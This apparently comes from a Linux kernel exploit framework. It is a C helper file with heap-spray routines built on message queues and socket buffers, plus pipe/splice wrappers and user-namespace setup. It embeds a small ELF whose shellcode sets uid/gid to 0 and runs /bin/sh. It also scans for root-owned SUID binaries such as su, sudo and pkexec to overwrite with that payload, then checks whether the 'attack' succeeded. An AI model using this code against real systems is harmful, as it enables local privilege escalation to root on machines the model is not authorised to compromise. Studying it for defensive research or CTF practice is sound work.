#include "util.h"

int debug=false;

//thread sync
int sync_pipe[2]={0};
void initSyncPipe()
{
    logi("init sync_pipe");
    testpipe(sync_pipe);
}


//msgmsg
char myTmpBuffer[0x2000];
int *mm;

int32_t mymsgget(key_t key, int msgflg, char * file, int32_t line) 
{
    int32_t result;
    result = msgget(key, msgflg);
    if (unlikely(result < 0)) 
    {
        perror("[!] msgget error");
        die1(file, line, "msgget exit!");
    }
    return result;
}

int32_t mymsgsnd(int msqid, void *msgp, size_t msgsz, int msgflg, char * file, int32_t line) 
{
    if (unlikely(msgsnd(msqid, msgp, msgsz, msgflg) == -1))
    {
        perror("[!] msgsend error");
        die1(file, line, "msgsnd exit!");
    }
    return 0;
}

ssize_t mymsgrcv(int msqid, void *msgp, size_t msgsz, long msgtyp, int msgflg, char * file, int32_t line) 
{
    ssize_t result;
    result = msgrcv(msqid, msgp, msgsz, msgtyp, msgflg);
    if (unlikely(result < 0))
    {
        perror("[!] msgrcv error");
        die1(file, line, "msgrcv exit!");
    }
    return result;
}

void myMsqInit(int * msqids, int nummsgs, char * file, int32_t line) 
{
    for (int i = 0; i < nummsgs; i++) 
    {
        msqids[i] = mymsgget(IPC_PRIVATE, IPC_CREAT | 0666, file, line);
    }
}

void myMSQInit(int nummsgs, char * file, int32_t line) 
{
    logi("init msg queue");
    mm = calloc(1, sizeof(int) * nummsgs);
    for (int i = 0; i < nummsgs; i++) 
    {
        mm[i] = mymsgget(IPC_PRIVATE, IPC_CREAT | 0666, file, line);
    }

}

void setMsgHead(void* msg, uint64_t m_list_next, uint64_t m_list_prev, uint64_t m_type, uint64_t m_ts, uint64_t next, uint64_t security) 
{
    ((msg_msg*)msg)->m_list_next = m_list_next;
    ((msg_msg*)msg)->m_list_prev = m_list_prev;
    ((msg_msg*)msg)->m_type = m_type;
    ((msg_msg*)msg)->m_ts = m_ts;
    ((msg_msg*)msg)->next = next;
    ((msg_msg*)msg)->security = security;
}


//skbuff
int nSocks;
int nSkBuffs;
int (*ss)[2];
int mysocket(int af, int type, int protocol, char * file, int32_t line)
{
    int sockfd = socket(af, type, protocol);
    if (unlikely(sockfd < 0)) 
    {
        perror("[!] socket error");
        die1(file, line, "socket exit!");
    }
    return sockfd;
}

void mysocketpair(int domain, int type, int protocol, int sv[2], char * file, int32_t line)
{
    if (unlikely(socketpair(domain, type, protocol, sv) < 0)) 
    {
        perror("[!] socketpair error");
        die1(file, line, "socketpair exit!");
    }
}
/*
void mySkfdInit(int ** sockfd, int nummsgs, char * file, int32_t line) 
{
    int (*tmpsockfd)[2] = (int (*)[2])sockfd;
    for (int i = 0; i < nummsgs; i++) 
        mysocketpair(AF_UNIX, SOCK_STREAM, 0, tmpsockfd[i], file, line);
}
*/

void mySkInit(int sockNum, int skbuffsPerSk, char * file, int32_t line)
{
    logi("init socket queue");
    SET_N_SOCKS(sockNum);
    SET_N_SKBUFFS(skbuffsPerSk);
    ss=calloc(1, nSocks*2*sizeof(int));
    for (int i = 0; i < nSocks; i++) 
        mysocketpair(AF_UNIX, SOCK_STREAM, 0, ss[i], file, line);
}

void mySpraySkbuff(const void *buf, size_t size, char * file, int32_t line)
{
    for (int i = 0; i < nSocks; i++) 
        for (int j = 0; j < nSkBuffs; j++) 
            mywrite(ss[i][0], buf, size, file, line);
}

void myFreeSkbuff(size_t size, char * file, int32_t line)
{
    for (int i = 0; i < nSocks; i++) 
        for (int j = 0; j < nSkBuffs; j++) 
        {
            myread(ss[i][1], myTmpBuffer, size, file, line);
            //debugLog("%s",myTmpBuffer);
        }
}

//pipe
int mypipe(int fd[2], char * file, int32_t line)
{
    if(unlikely(pipe(fd) < 0))
    {
        perror("[!] pipe error");
        die1(file, line, "pipe exit!");
    }
    return 0;
}

ssize_t mysplice(int fd_in , void * off_in , int fd_out , void * off_out , size_t len , unsigned int flags, char * file, int32_t line) 
{
    int result=splice(fd_in, off_in, fd_out, off_out, len, flags);
    if (unlikely(result < 0)) 
    {
        perror("[!] splice error");
        die1(file, line, "splice exit!");
    }  
    return result;
}


//normal
void bindCpu() 
{
    cpu_set_t my_set;
    CPU_ZERO(&my_set);
    CPU_SET(0, &my_set);
    if (sched_setaffinity(0, sizeof(cpu_set_t), &my_set)) 
    {
        die("bind cpu error");
    }
}

void initUnshare() {
    int fd;
    char buff[0x100];

    // strace from `unshare -Ur xxx`
    unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);

    fd = open("/proc/self/setgroups", O_WRONLY);
    snprintf(buff, sizeof(buff), "deny");
    write(fd, buff, strlen(buff));
    close(fd);

    fd = open("/proc/self/uid_map", O_WRONLY);
    snprintf(buff, sizeof(buff), "0 %d 1", getuid());
    write(fd, buff, strlen(buff));
    close(fd);

    fd = open("/proc/self/gid_map", O_WRONLY);
    snprintf(buff, sizeof(buff), "0 %d 1", getgid());
    write(fd, buff, strlen(buff));
    close(fd);

    logd("unshare init success!");
}

void hexdump(const void *data, size_t size) 
{
    char ascii[17];
    size_t i, j;
    ascii[16] = '\0';
    for (i = 0; i < size; ++i) 
    {
        dprintf(2, "%02X ", ((unsigned char *)data)[i]);
        if (((unsigned char *)data)[i] >= ' ' && ((unsigned char *)data)[i] <= '~') 
        {
            ascii[i % 16] = ((unsigned char *)data)[i];
        } else 
        {
            ascii[i % 16] = '.';
        }
        if ((i + 1) % 8 == 0 || i + 1 == size) 
        {
            dprintf(2, " ");
            if ((i + 1) % 16 == 0) 
            {
                dprintf(2, "|  %s \n", ascii);
            } 
            else if (i + 1 == size) 
            {
                ascii[(i + 1) % 16] = '\0';
                if ((i + 1) % 16 <= 8) 
                {
                    dprintf(2, " ");
                }
                for (j = (i + 1) % 16; j < 16; ++j) 
                {
                    dprintf(2, "   ");
                }
                dprintf(2, "|  %s \n", ascii);
            }
        }
    }
}

void debugPause()
{
    logi("input anything to continue");
    getchar();
}

int myopen(char *path,int flags, char * file, int32_t line)
{
    int result = open(path, flags);
    if(unlikely(result < 0))
    {
        perror("[!] open error");
        die1(file, line, "open exit!");
    }
    return result;
}


ssize_t mywrite(int fd, const void *buf, size_t nbyte, char * file, int32_t line)
{
    int nbytes = write(fd, buf, nbyte);
    if (unlikely(nbytes < 0)) 
    {
        perror("[!] write error");
        die1(file, line, "write exit!");
    }
    return nbytes;
}

ssize_t myread(int fd, void *buf, size_t nbyte, char * file, int32_t line)
{
    int nbytes = read(fd, buf, nbyte);
    if(unlikely(nbytes < 0))
    {
        perror("[!] read error");
        die1(file, line, "read exit!");
    }
    return nbytes;
}

//get suid file


const char shellElf[] = {
    0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00,
    0x00, 0x56, 0x56, 0x56, 0x56, 0x00, 0x00, 0x00,
    0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,
    0xb0, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00,
    0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00,
    0x02, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x01, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00,
    0xf6, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xf6, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x51, 0xe5, 0x74, 0x64, 0x07, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x31, 0xff, 0x31, 0xd2, 0x31, 0xf6, 0x6a, 0x75,
    0x58, 0x0f, 0x05, 0x31, 0xff, 0x31, 0xd2, 0x31,
    0xf6, 0x6a, 0x77, 0x58, 0x0f, 0x05, 0x6a, 0x68,
    0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f,
    0x2f, 0x73, 0x50, 0x48, 0x89, 0xe7, 0x68, 0x72,
    0x69, 0x01, 0x01, 0x81, 0x34, 0x24, 0x01, 0x01,
    0x01, 0x01, 0x31, 0xf6, 0x56, 0x6a, 0x08, 0x5e,
    0x48, 0x01, 0xe6, 0x56, 0x48, 0x89, 0xe6, 0x31,
    0xd2, 0x6a, 0x3b, 0x58, 0x0f, 0x05};
int shellElfLen=0;
char targetFile[0x50];
char suidDefaultDic[9][20] = {
    "mount",
    "su",
    "sudo",
    "passwd",
    "gpasswd",
    "newgrp",
    "pkexec",
    "pppd",
    "over"
};


void getTargetFile()
{
    shellElfLen = sizeof(shellElf);
    FILE * cmdfd;
    struct stat st;
    int i;
    char (* cmdName)[20] = suidDefaultDic;
    for(i=0;strcmp("over",cmdName[i]);i++)
    {
        char cmdline[0x50]="which ";
        strcat(cmdline,cmdName[i]);
        cmdfd = popen(cmdline,"r");
        if(fgets(targetFile,0x50,cmdfd) == NULL)
        {
            pclose(cmdfd);
            continue;
        }
        pclose(cmdfd);   
        targetFile[strlen(targetFile)-1]='\x00';
        stat(targetFile,&st);
        if((st.st_mode & S_ISUID) && st.st_uid == 0 && (st.st_size >= shellElfLen))
        {
            logd("File with SUID: %s",targetFile);
            break;
        }
    }
    if(!strcmp("over",cmdName[i]))
        die("There isn't any file with SUID!");
}

int ifAtkSuccess()
{
    int fd = open(targetFile,O_RDONLY),i;
    char tmp[1];
    for(i=0;i<shellElfLen;i++)
    {
        testread(fd,tmp,1);
        if(shellElf[i] != tmp[0])
            die("Attack fail!");
    }
    logd("Attack success!");
    close(fd);
    return true;
}




